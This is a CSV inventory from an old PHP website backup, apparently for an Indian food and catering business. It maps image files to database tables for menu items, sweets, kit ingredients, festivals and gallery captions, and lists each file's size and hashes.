4.jpg,old-website-php/Full-website-backup/frontEnd/location/4.jpg,10290,f25ca8ccce002ae016edc22f8d935adea26233541fdd778bad8de9408b39c671,e17d3983e51cecf96acdd3cd1945bc76,DB Mapped (Verified),website_gallery,4,Images 4,gimage
4.jpg,old-website-php/Full-website-backup/frontEnd/location/4.jpg,10290,f25ca8ccce002ae016edc22f8d935adea26233541fdd778bad8de9408b39c671,e17d3983e51cecf96acdd3cd1945bc76,DB Mapped (Verified),recipe_appliances_kits,4,Spatula,kits_img
4.jpg,old-website-php/Full-website-backup/frontEnd/location/4.jpg,10290,f25ca8ccce002ae016edc22f8d935adea26233541fdd778bad8de9408b39c671,e17d3983e51cecf96acdd3cd1945bc76,DB Mapped (Verified),event_cuisine,4,Flame Grilled to Perfection,cuisine_img
4.png,old-website-php/Full-website-backup/frontEnd/location/4.png,3768,5cf8b113844af63040a908bf4923e0d1d5b9bcd803bff11ac81eda3acc44459d,9067e1d216b15cd226bae90cef8c9e61,DB Mapped (Verified),event_requirement,4,Bhai Dooj,event_img
5.jpg,old-website-php/Full-website-backup/frontEnd/location/5.jpg,11701,7938d6b17f64eaa22a068b32b839ad76270725920ce2df872db836634c7231bf,3c1c9824301f3b4dfcaa9b69cdfc4005,DB Mapped (Verified),product_item_tbl,5,Loose Namek Pare,menu_img
5.jpg,old-website-php/Full-website-backup/frontEnd/location/5.jpg,11701,7938d6b17f64eaa22a068b32b839ad76270725920ce2df872db836634c7231bf,3c1c9824301f3b4dfcaa9b69cdfc4005,DB Mapped (Verified),website_gallery,5,Images 5,gimage
5.jpg,old-website-php/Full-website-backup/frontEnd/location/5.jpg,11701,7938d6b17f64eaa22a068b32b839ad76270725920ce2df872db836634c7231bf,3c1c9824301f3b4dfcaa9b69cdfc4005,DB Mapped (Verified),recipe_appliances_kits,5,Toothpicks,kits_img
5.jpg,old-website-php/Full-website-backup/frontEnd/location/5.jpg,11701,7938d6b17f64eaa22a068b32b839ad76270725920ce2df872db836634c7231bf,3c1c9824301f3b4dfcaa9b69cdfc4005,DB Mapped (Verified),event_cuisine,5,First meal of the day,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/location/6.jpg,13337,04b9b8255328af1a6580203a70096262ba6251171bb57cf3efaafe4863dc2cd5,cb2b2d6f9c9fdbb929ad158b79998dfe,DB Mapped (Verified),product_item_tbl,6,Masala Pare,menu_img
6.jpg,old-website-php/Full-website-backup/frontEnd/location/6.jpg,13337,04b9b8255328af1a6580203a70096262ba6251171bb57cf3efaafe4863dc2cd5,cb2b2d6f9c9fdbb929ad158b79998dfe,DB Mapped (Verified),website_gallery,6,Images 6,gimage
6.jpg,old-website-php/Full-website-backup/frontEnd/location/6.jpg,13337,04b9b8255328af1a6580203a70096262ba6251171bb57cf3efaafe4863dc2cd5,cb2b2d6f9c9fdbb929ad158b79998dfe,DB Mapped (Verified),worke_work_experience,6,as worked at,workproimg
6.jpg,old-website-php/Full-website-backup/frontEnd/location/6.jpg,13337,04b9b8255328af1a6580203a70096262ba6251171bb57cf3efaafe4863dc2cd5,cb2b2d6f9c9fdbb929ad158b79998dfe,DB Mapped (Verified),recipe_appliances_kits,6,Lemon,kits_img
6.jpg,old-website-php/Full-website-backup/frontEnd/location/6.jpg,13337,04b9b8255328af1a6580203a70096262ba6251171bb57cf3efaafe4863dc2cd5,cb2b2d6f9c9fdbb929ad158b79998dfe,DB Mapped (Verified),event_cuisine,6,Mithas Dil Se,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/location/6.jpg,13337,04b9b8255328af1a6580203a70096262ba6251171bb57cf3efaafe4863dc2cd5,cb2b2d6f9c9fdbb929ad158b79998dfe,DB Mapped (Verified),event_requirement,6,Good Friday,event_img
7.jpg,old-website-php/Full-website-backup/frontEnd/location/7.jpg,11729,ceff290f5ae91c2baf77031380debd4b0d0bf8ce2aa33a5af875e96f64c14d3e,d71659d08dbef27543eb8a1ade498b64,DB Mapped (Verified),menu_item_tbl,7,Curd Rice,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/location/7.jpg,11729,ceff290f5ae91c2baf77031380debd4b0d0bf8ce2aa33a5af875e96f64c14d3e,d71659d08dbef27543eb8a1ade498b64,DB Mapped (Verified),product_item_tbl,7,Pithi Kachori,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/location/7.jpg,11729,ceff290f5ae91c2baf77031380debd4b0d0bf8ce2aa33a5af875e96f64c14d3e,d71659d08dbef27543eb8a1ade498b64,DB Mapped (Verified),worke_work_experience,7,knows these Cuisines3,workproimg
7.jpg,old-website-php/Full-website-backup/frontEnd/location/7.jpg,11729,ceff290f5ae91c2baf77031380debd4b0d0bf8ce2aa33a5af875e96f64c14d3e,d71659d08dbef27543eb8a1ade498b64,DB Mapped (Verified),recipe_appliances_kits,7,Coriander Leaves,kits_img
7.jpg,old-website-php/Full-website-backup/frontEnd/location/7.jpg,11729,ceff290f5ae91c2baf77031380debd4b0d0bf8ce2aa33a5af875e96f64c14d3e,d71659d08dbef27543eb8a1ade498b64,DB Mapped (Verified),event_cuisine,7,Soups & Beverages,cuisine_img
8.jpg,old-website-php/Full-website-backup/frontEnd/location/8.jpg,13918,eea21112daf6178ebf6151d56591b5a4cdcff140ae522fc761720ac155ea17ed,f09afe26ce0314eef984cec16d0b6ba3,DB Mapped (Verified),product_item_tbl,8,Sakkar Pare,menu_img
8.jpg,old-website-php/Full-website-backup/frontEnd/location/8.jpg,13918,eea21112daf6178ebf6151d56591b5a4cdcff140ae522fc761720ac155ea17ed,f09afe26ce0314eef984cec16d0b6ba3,DB Mapped (Verified),worke_work_experience,8,knows these Cuisines,workproimg
8.jpg,old-website-php/Full-website-backup/frontEnd/location/8.jpg,13918,eea21112daf6178ebf6151d56591b5a4cdcff140ae522fc761720ac155ea17ed,f09afe26ce0314eef984cec16d0b6ba3,DB Mapped (Verified),recipe_appliances_kits,8,Salt,kits_img
8.jpg,old-website-php/Full-website-backup/frontEnd/location/8.jpg,13918,eea21112daf6178ebf6151d56591b5a4cdcff140ae522fc761720ac155ea17ed,f09afe26ce0314eef984cec16d0b6ba3,DB Mapped (Verified),event_cuisine,8,Starters,cuisine_img
9.jpg,old-website-php/Full-website-backup/frontEnd/location/9.jpg,1980756,ec3c8ce7b6ed34a17e4bb5cf319b0c3f0dcade0ec0aa1bc80f22ddb696834707,c37fdd9f4c5edb9e32a257a0bbef1afb,DB Mapped (Verified),menu_item_tbl,9,Tamarind Rice,menu_img
9.jpg,old-website-php/Full-website-backup/frontEnd/location/9.jpg,1980756,ec3c8ce7b6ed34a17e4bb5cf319b0c3f0dcade0ec0aa1bc80f22ddb696834707,c37fdd9f4c5edb9e32a257a0bbef1afb,DB Mapped (Verified),product_item_tbl,9,Atta Dry Fruit Laddoo,menu_img
9.jpg,old-website-php/Full-website-backup/frontEnd/location/9.jpg,1980756,ec3c8ce7b6ed34a17e4bb5cf319b0c3f0dcade0ec0aa1bc80f22ddb696834707,c37fdd9f4c5edb9e32a257a0bbef1afb,DB Mapped (Verified),worke_work_experience,9,knows these Cuisines2,workproimg
9.jpg,old-website-php/Full-website-backup/frontEnd/location/9.jpg,1980756,ec3c8ce7b6ed34a17e4bb5cf319b0c3f0dcade0ec0aa1bc80f22ddb696834707,c37fdd9f4c5edb9e32a257a0bbef1afb,DB Mapped (Verified),recipe_appliances_kits,9,Green Capsicum,kits_img
9.webp,old-website-php/Full-website-backup/frontEnd/location/9.webp,2755654,9a5af97a87b9eb85ebe8a04dcc778daf4403a4e5647c2e6d722b278d417a2d53,18553946770d56847bb61cab7737396e,Static / Orphaned Disk Asset,,,,
1.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_small_img
1.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),product_item_tbl,1,Desi Bundi Laddo,menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),website_gallery,1,Images 1,gimage
1.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),recipe_appliances_kits,1,Onion,kits_img
1.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/1.jpg,7794,6796f0d40363473784005426c792e76d1a974110e36dc986a327f5a9ce5ce915,5493c1b32af8855136fae3eebdccd8c7,DB Mapped (Verified),event_cuisine,1,South Indian,cuisine_img
10.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/10.jpeg,14662,ef167e1088bca29a322b4f713173de84605c905cfc97b01cde3a54f91b11a405,d9f091839b78fe2c7def2ba115d1d9d7,DB Mapped (Verified),menu_item_tbl,10,Dal Makhini,menu_img
100.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/100.jpg,78801,d3e5e53fd4b44cf70760db76ee699f9a44f73d6d52bad34103ffef3323a351ae,647e9fc160ac7056fe6873378331eff5,DB Mapped (Verified),menu_item_tbl,100,Gulgula - Uttarakhand,menu_img
101.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/101.jpeg,10706,f430f7e757ba74fd9a0ccfce38a7da2f97215c4fd7359fd7e89c25aae82267c8,a0e0720d83d2d753685025cafe882741,DB Mapped (Verified),menu_item_tbl,101,Arsa - Uttarakhand,menu_img
102.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/102.jpg,51889,446392921d32a1ab25bbb70c2c3020ba52fe9934eab4c5a71e54607e5df34ffe,258b993b6b5a6722d5473c7281395c78,DB Mapped (Verified),menu_item_tbl,102,Naivedyam - Bihar,menu_img
103.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/103.jpeg,9435,a81ffe193d71e631dc23cca09584190f1a2f43eb11611089a67cf31c2ae2349b,3b6ec918699f45dedc99d71ad1599d32,DB Mapped (Verified),menu_item_tbl,103,Chandrakala/ Pedakiya - Bihar,menu_img
104.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/104.jpg,26446,ddf92b39bd8e40bb92745bc365d58e238d35685faa2c388b8881a10e2081f16f,9da451a4d260ca86e3a500b6db3815a4,DB Mapped (Verified),menu_item_tbl,104,Khaja - Bihar,menu_img
105.webp,old-website-php/Full-website-backup/frontEnd/menuimg/105.webp,26278,bd42909481a32c597353c59f38b3803fda71af01c2e876e8cec31b950ab76f8e,a95e04498293165e0c0cc393e09c9641,DB Mapped (Verified),menu_item_tbl,105,Kesar Peda - Bihar,menu_img
106.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/106.jpg,407462,341988e7a8b56b4d76ab7741e9c7fe3eae23ddeed0b538f3d57770abcfcfd4be,910a2dc7e3ccb2cff43b79b18f892bcc,DB Mapped (Verified),menu_item_tbl,106,Laung-Latika - Bihar,menu_img
107.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/107.jpeg,10671,90d20dd37a2bc1dccad657ff692e4df222d9f4ef5d6040b236058243e56ddcdc,61edca3845f7f315ecbedf496373fb01,DB Mapped (Verified),menu_item_tbl,107,Malpua - Bihar,menu_img
108.webp,old-website-php/Full-website-backup/frontEnd/menuimg/108.webp,19502,b4712da72a5152ce80550039dd891bb0a51117d6ed2cc6e620a9591e7d0711ad,3d303359ad00ffdb30722314c9ac9149,DB Mapped (Verified),menu_item_tbl,108,Rasia - Bihar,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),menu_item_tbl,11,Dal Tadka,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),product_item_tbl,11,Balushai,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),website_gallery,11,Event at Delhi,gimage
11.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),worke_work_experience,11,North Indian Dishes by,workproimg
11.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/11.jpg,139024,b9f1977e92fc89aa7892e0cf77d32991aa1b391f2b5eebac1d337a43bfac2e55,54ec79b6c074adb4493af22a111d352f,DB Mapped (Verified),recipe_appliances_kits,11,Yellow Bell Pepper,kits_img
110.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/110.jpeg,10093,6b4c5e210163c4b4644bfc0750a7ea8db60057ee2470c57e87436330be1a4649,4d513da840b1054e04c581ba063d1c5a,DB Mapped (Verified),menu_item_tbl,110,Khurma And Laktho - Bihar,menu_img
111.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/111.jpeg,6969,4c4cf62755a61b9c9419f6300116f4f5ea434e44253dfa43195a1944f9259f1a,68b7c2719cf26963173ea6ef68076319,DB Mapped (Verified),menu_item_tbl,111,Balushahi - Bihar,menu_img
112.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/112.jpeg,7632,9fc8b53bba400bcd797ac25b3b181c5c9886323be6849960ba5cbbf35805777f,80e0eb316316377eb627f63e0f4d2ca0,DB Mapped (Verified),menu_item_tbl,112,Parwal ki Mithai - Bihar,menu_img
113.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/113.jpeg,112246,0825d65ecdf014c2b0a56a849d71ac2bd0143b9b37f87cb05802788fbda1e96e,2b754ec5aeeed8ca93b5a8e7d33e741a,DB Mapped (Verified),menu_item_tbl,113,Gur Anarsa - Bihar,menu_img
114.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/114.jpeg,35872,6e92d6bf9ed356dca00f024f86925df5e80bfc661fa452f26c40c06585ab6690,7861923a3f78ca8532ec6b315d96b8c8,DB Mapped (Verified),menu_item_tbl,114,Laai - Bihar,menu_img
115.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/115.jpeg,8888,3b1e69bace003789c889c06ea6a6bb0649fff14196f82c6e350aef0bb8f4ad04,7d0d9f8672ad36a72ad2b77c8974f58b,DB Mapped (Verified),menu_item_tbl,115,Tilkut - Bihar,menu_img
116.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/116.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,116,Litti Chokha - Bihar,menu_img
116.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/116.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,116,Litti Chokha - Bihar,menu_small_img
117.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/117.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,117,Chana Ghugni - Bihar,menu_img
117.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/117.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,117,Chana Ghugni - Bihar,menu_small_img
118.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/118.jpg,14617,b97b73de898a9696ad59302bcea5a6d9e645747f0b73150b2f0994620a595528,f261d7eb63d1769cd2a1f309fa6774f8,DB Mapped (Verified),menu_item_tbl,118,Mutton Kebabs & Reshmi Kebabs - Bihar,menu_img
118.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/118.jpg,14617,b97b73de898a9696ad59302bcea5a6d9e645747f0b73150b2f0994620a595528,f261d7eb63d1769cd2a1f309fa6774f8,DB Mapped (Verified),menu_item_tbl,118,Mutton Kebabs & Reshmi Kebabs - Bihar,menu_small_img
119.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/119.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,119,Dal Peetha - Bihar,menu_img
119.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/119.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,119,Dal Peetha - Bihar,menu_small_img
12.webp,old-website-php/Full-website-backup/frontEnd/menuimg/12.webp,50084,da26dbfd180c3f7b774c92b0ca4643762e56f3b45114129f42158177e166eb57,3f9c183cef6e5274b434112eb69709b3,DB Mapped (Verified),menu_item_tbl,12,Malai Kofta,menu_img
120.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/120.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,120,Khajuria/Thekua - Bihar,menu_img
120.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/120.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,120,Khajuria/Thekua - Bihar,menu_small_img
121.webp,old-website-php/Full-website-backup/frontEnd/menuimg/121.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,121,Puri Sabzi - Bihar,menu_img
121.webp,old-website-php/Full-website-backup/frontEnd/menuimg/121.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,121,Puri Sabzi - Bihar,menu_small_img
122.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/122.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,122,Sattu Sharbat - Bihar,menu_img
122.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/122.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,122,Sattu Sharbat - Bihar,menu_small_img
123.JPG,old-website-php/Full-website-backup/frontEnd/menuimg/123.JPG,15529,c7bb429187506f63d57abab808b7b2ce858ec9bef33609c256451558a92000b5,cbd559d3da348464d918e8b6055fc49a,DB Mapped (Verified),menu_item_tbl,123,Sattu Paratha - Bihar,menu_img
123.JPG,old-website-php/Full-website-backup/frontEnd/menuimg/123.JPG,15529,c7bb429187506f63d57abab808b7b2ce858ec9bef33609c256451558a92000b5,cbd559d3da348464d918e8b6055fc49a,DB Mapped (Verified),menu_item_tbl,123,Sattu Paratha - Bihar,menu_small_img
124.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/124.jpeg,15745,036ac766a5cdb5653f0c05e1ca831eb33198374ef92fee4576b50e34fa4f62e8,32c0bcebbeeca789df9c4922e0dc18dd,DB Mapped (Verified),menu_item_tbl,124,Singri ki Sabzi,menu_img
124.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/124.jpeg,15745,036ac766a5cdb5653f0c05e1ca831eb33198374ef92fee4576b50e34fa4f62e8,32c0bcebbeeca789df9c4922e0dc18dd,DB Mapped (Verified),menu_item_tbl,124,Singri ki Sabzi,menu_small_img
125.webp,old-website-php/Full-website-backup/frontEnd/menuimg/125.webp,60970,a3386d5b9020fdbe376bff387353dbf4e5218dca060dd660f4165ac1d6d348fa,c32749492254243f209f7de604355af3,DB Mapped (Verified),menu_item_tbl,125,Mixed Dals,menu_img
125.webp,old-website-php/Full-website-backup/frontEnd/menuimg/125.webp,60970,a3386d5b9020fdbe376bff387353dbf4e5218dca060dd660f4165ac1d6d348fa,c32749492254243f209f7de604355af3,DB Mapped (Verified),menu_item_tbl,125,Mixed Dals,menu_small_img
126.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/126.jpeg,8207,55acdf72c5a3760c5fdd910330645fd20e0737e4d5efd00a2f2958dcfab21da9,f2766e3ceec3a52d9fc05b9a4be70c5e,DB Mapped (Verified),menu_item_tbl,126,Hara Dhania Choliya,menu_img
126.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/126.jpeg,8207,55acdf72c5a3760c5fdd910330645fd20e0737e4d5efd00a2f2958dcfab21da9,f2766e3ceec3a52d9fc05b9a4be70c5e,DB Mapped (Verified),menu_item_tbl,126,Hara Dhania Choliya,menu_small_img
127.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/127.jpeg,13441,7c83bebb5b99b29c1fb4eee0543371ef2c8480d66f297e7bf7121c1fa070345d,933ac02c763255c99f4f237a6085efbc,DB Mapped (Verified),menu_item_tbl,127,Kadhi Pakora,menu_img
127.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/127.jpeg,13441,7c83bebb5b99b29c1fb4eee0543371ef2c8480d66f297e7bf7121c1fa070345d,933ac02c763255c99f4f237a6085efbc,DB Mapped (Verified),menu_item_tbl,127,Kadhi Pakora,menu_small_img
128.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/128.jpeg,12345,cc2ca49cf5f587b56ea4e7766413463cc4719ad18e1f639441b367c85a0cd182,3960a6a9093d1e84d06087ce3c3ee27a,DB Mapped (Verified),menu_item_tbl,128,Kachri ki Chutney,menu_img
128.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/128.jpeg,12345,cc2ca49cf5f587b56ea4e7766413463cc4719ad18e1f639441b367c85a0cd182,3960a6a9093d1e84d06087ce3c3ee27a,DB Mapped (Verified),menu_item_tbl,128,Kachri ki Chutney,menu_small_img
129.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/129.jpeg,13520,637261aa3b31c7ed6fe754c5775a9583f94bb34ebff5f30a78ea622fc06b86b1,eba4f73c182fbbd2b0c92f271cec9a34,DB Mapped (Verified),menu_item_tbl,129,Tamatar Chutney,menu_img
129.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/129.jpeg,13520,637261aa3b31c7ed6fe754c5775a9583f94bb34ebff5f30a78ea622fc06b86b1,eba4f73c182fbbd2b0c92f271cec9a34,DB Mapped (Verified),menu_item_tbl,129,Tamatar Chutney,menu_small_img
13.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),menu_item_tbl,13,Paneer Lababdar,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),product_item_tbl,13,Besan Laddo,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),website_gallery,13,Evevt At rishikesh,gimage
13.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),worke_work_experience,13,tarters Dishes by1,workproimg
13.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/13.jpg,55212,e5083924601e56f06a24d49993cb431780e0b58b26eda71d7861047b52bf73b1,f6478fae6850eb29414b414fe5b1e6d4,DB Mapped (Verified),recipe_appliances_kits,13,Mint Leaves,kits_img
130.webp,old-website-php/Full-website-backup/frontEnd/menuimg/130.webp,72510,ac6898e18887483197b8a4ec06079ac90143cefd2990c20b76ee46bd65180bd2,009acea811ddc5c7d95cbd46bc33b10c,DB Mapped (Verified),menu_item_tbl,130,Dahi Vada,menu_img
130.webp,old-website-php/Full-website-backup/frontEnd/menuimg/130.webp,72510,ac6898e18887483197b8a4ec06079ac90143cefd2990c20b76ee46bd65180bd2,009acea811ddc5c7d95cbd46bc33b10c,DB Mapped (Verified),menu_item_tbl,130,Dahi Vada,menu_small_img
131.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/131.jpeg,8644,3e1664cceb6cccbe94034ff6f23fd625aec6c62202c0662c59c2d1e517fe9b36,7693d33c11abb4aae524e9721d27910a,DB Mapped (Verified),menu_item_tbl,131,Rajma Chawal,menu_img
131.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/131.jpeg,8644,3e1664cceb6cccbe94034ff6f23fd625aec6c62202c0662c59c2d1e517fe9b36,7693d33c11abb4aae524e9721d27910a,DB Mapped (Verified),menu_item_tbl,131,Rajma Chawal,menu_small_img
132.webp,old-website-php/Full-website-backup/frontEnd/menuimg/132.webp,64206,0a70e0fbb6880820ac7b5af61ebd1bdc155425e4300a85756d67b2984880d2f3,2f7c55da53a4fbdb269b62547a1f2d3d,DB Mapped (Verified),menu_item_tbl,132,Malpua - Haryana,menu_img
133.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/133.jpg,69900,5be4b95a5a85ab589e87158aa55cb0841709d018a5653455fe540c4c9637e16e,9dc1b72a7b16e8e5eed4ac234cbdb91d,DB Mapped (Verified),menu_item_tbl,133,Mithe Chawal - Haryana,menu_img
134.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/134.jpeg,12412,970cbbaaf4a9ce0ae5bf44fc49f8b7ed5ea89f5f7593b4138be36e5406e9d877,9a44fce152a4c98cf31c777ec4803c3d,DB Mapped (Verified),menu_item_tbl,134,Methi Gaajar - Haryana,menu_img
135.webp,old-website-php/Full-website-backup/frontEnd/menuimg/135.webp,48044,d9b7b2405ab798dd5967a56466192c2914d9cb1bb11234ca63c726b9f272bc42,0223b17c9173ad29d80b619bf5323eb8,DB Mapped (Verified),menu_item_tbl,135,Alsi ki Pinni - Haryana,menu_img
136.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/136.jpg,54895,3098d32e20e94dd88233a4a9b3f3909a890e1a5f4534d5d9ed18e5f53547066e,69f7df5a20166f610db024e2d4f4b6cb,DB Mapped (Verified),menu_item_tbl,136,Besan Masala Roti - Haryana,menu_img
136.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/136.jpg,54895,3098d32e20e94dd88233a4a9b3f3909a890e1a5f4534d5d9ed18e5f53547066e,69f7df5a20166f610db024e2d4f4b6cb,DB Mapped (Verified),menu_item_tbl,136,Besan Masala Roti - Haryana,menu_small_img
137.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/137.jpg,34081,33b794611db49d3b5108c31d548431b684035b85728186120748110e3082d6c4,187eb880e346af58b209c813713dde38,DB Mapped (Verified),menu_item_tbl,137,Bhura Roti Ghee - Haryana,menu_img
137.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/137.jpg,34081,33b794611db49d3b5108c31d548431b684035b85728186120748110e3082d6c4,187eb880e346af58b209c813713dde38,DB Mapped (Verified),menu_item_tbl,137,Bhura Roti Ghee - Haryana,menu_small_img
138.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/138.jpg,11603,f29c6fb10441cbdf0f717e74aa1af59b67a2a9a330722524eacd2d5a13b0d16f,f35a8db35da78e9dc05f059d83e19151,DB Mapped (Verified),menu_item_tbl,138,Bajara Aloo Roti - Haryana,menu_img
138.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/138.jpg,11603,f29c6fb10441cbdf0f717e74aa1af59b67a2a9a330722524eacd2d5a13b0d16f,f35a8db35da78e9dc05f059d83e19151,DB Mapped (Verified),menu_item_tbl,138,Bajara Aloo Roti - Haryana,menu_small_img
139.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/139.jpg,40862,31fa2e605a8c91f8ba84ba4bc40c7de93f009e5f7228d005580c828316f0138b,68fa040f3aa3bd5e802c8b2e778db746,DB Mapped (Verified),menu_item_tbl,139,Bajara Khichri - Haryana,menu_img
14.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/14.jpeg,9108,11f6d2118b1fe891203710e26ef40071c21c4cdf10caee5ad42b9e840915b620,b5c735c46baf1441994ba535dd1ab4a5,DB Mapped (Verified),menu_item_tbl,14,Dum Aloo,menu_img
